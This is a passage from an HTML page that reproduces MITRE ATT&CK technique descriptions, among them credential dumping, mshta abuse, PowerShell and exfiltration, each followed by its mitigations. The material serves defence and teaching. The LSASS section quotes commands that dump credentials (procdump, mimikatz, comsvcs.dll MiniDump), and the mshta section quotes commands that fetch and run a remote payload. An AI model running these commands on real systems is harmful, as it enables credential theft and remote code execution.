Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Encrypt Sensitive Information - Protect sensitive information with strong encryption.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Exfiltration Over C2 Channel</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Data Loss Prevention - Use a data loss prevention (DLP) strategy to categorize sensitive data, identify data formats indicative of personal identifiable information (PII), and restrict exfiltration of sensitive data.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">External Remote Services</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as <a href="https://attack.mitre.org/techniques/T1021/006">Windows Remote Management</a> and <a href="https://attack.mitre.org/techniques/T1021/005">VNC</a> can also be used externally.

Access to <a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a> to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.

Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Limit Access to Resource Over Network - Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.</span></p>
                            <p><span style="padding-left: 80px; display:block">Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Indicator Removal on Host: File Deletion</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native <a href="https://attack.mitre.org/software/S0106">cmd</a> functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. </span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Application Layer Protocol: File Transfer Protocols</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">File and Directory Discovery</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from <a href="https://attack.mitre.org/techniques/T1083">File and Directory Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the <a href="https://attack.mitre.org/techniques/T1106">Native API</a>.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Ingress Tool Transfer</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Command and Scripting Interpreter: JavaScript</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.

JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the <a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a> and Internet Explorer HTML Application (HTA) pages.

JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and <a href="https://attack.mitre.org/techniques/T1059/002">AppleScript</a>. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.

Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a <a href="https://attack.mitre.org/techniques/T1189">Drive-by Compromise</a> or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of <a href="https://attack.mitre.org/techniques/T1027">Obfuscated Files or Information</a>.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Input Capture: Keylogging</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when <a href="https://attack.mitre.org/techniques/T1003">OS Credential Dumping</a> efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike <a href="https://attack.mitre.org/techniques/T1056/004">Credential API Hooking</a>, this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* <a href="https://attack.mitre.org/techniques/T1601">Modify System Image</a> may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. </span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">OS Credential Dumping: LSASS Memory</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct <a href="https://attack.mitre.org/tactics/TA0008">Lateral Movement</a> using <a href="https://attack.mitre.org/techniques/T1550">Use Alternate Authentication Material</a>.

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as comsvcs.dll can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>


Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.
</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p>
                            <p><span style="padding-left: 80px; display:block">Credential Access Protection - Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.</span></p>
                            <p><span style="padding-left: 80px; display:block">Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</span></p>
                            <p><span style="padding-left: 80px; display:block">Password Policies - Set and enforce secure password policies for accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Process Integrity - Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Valid Accounts: Local Accounts</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through <a href="https://attack.mitre.org/techniques/T1003">OS Credential Dumping</a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Password Policies - Set and enforce secure password policies for accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Data Staged: Local Data Staging</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href="https://attack.mitre.org/techniques/T1560">Archive Collected Data</a>. Interactive command shells may be used, and common functionality within <a href="https://attack.mitre.org/software/S0106">cmd</a> and bash may be used to copy data into a staging location.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Application Layer Protocol: Mail Protocols</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">User Execution: Malicious File</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from <a href="https://attack.mitre.org/techniques/T1566/001">Spearphishing Attachment</a>. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> on the file to increase the likelihood that a user will open it.

While <a href="https://attack.mitre.org/techniques/T1204/002">Malicious File</a> frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after <a href="https://attack.mitre.org/techniques/T1534">Internal Spearphishing</a>.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Masquerading: Masquerade Task or Service</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Modify Registry</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility <a href="https://attack.mitre.org/software/S0075">Reg</a> may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via <a href="https://attack.mitre.org/software/S0075">Reg</a> or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often <a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a> are required, along with access to the remote system's <a href="https://attack.mitre.org/techniques/T1021/002">SMB/Windows Admin Shares</a> for RPC communication.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Restrict Registry Permissions - Restrict the ability to modify certain hives or keys in the Windows Registry.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Signed Binary Proxy Execution: Mshta</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Network Sniffing</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as <a href="https://attack.mitre.org/techniques/T1557/001">LLMNR/NBT-NS Poisoning and SMB Relay</a>, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Encrypt Sensitive Information - Protect sensitive information with strong encryption.</span></p>
                            <p><span style="padding-left: 80px; display:block">Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Obfuscated Files or Information</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and <a href="https://attack.mitre.org/techniques/T1140">Deobfuscate/Decode Files or Information</a> for <a href="https://attack.mitre.org/techniques/T1204">User Execution</a>. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. 

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. 

Adversaries may also obfuscate commands executed from payloads or directly via a <a href="https://attack.mitre.org/techniques/T1059">Command and Scripting Interpreter</a>. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Use Alternate Authentication Material: Pass the Hash</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a <a href="https://attack.mitre.org/tactics/TA0006">Credential Access</a> technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform <a href="https://attack.mitre.org/techniques/T1550/003">Pass the Ticket</a> attacks.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p>
                            <p><span style="padding-left: 80px; display:block">Update Software - Perform regular software updates to mitigate exploitation risk.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Control - Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Command and Scripting Interpreter: PowerShell</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including <a href="https://attack.mitre.org/software/S0363">Empire</a>,  <a href="https://attack.mitre.org/software/S0194">PowerSploit</a>, <a href="https://attack.mitre.org/software/S0378">PoshC2</a>, and PSAttack.

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Code Signing - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</span></p>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Process Injection</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Command and Scripting Interpreter: Python</span></h5></summary>
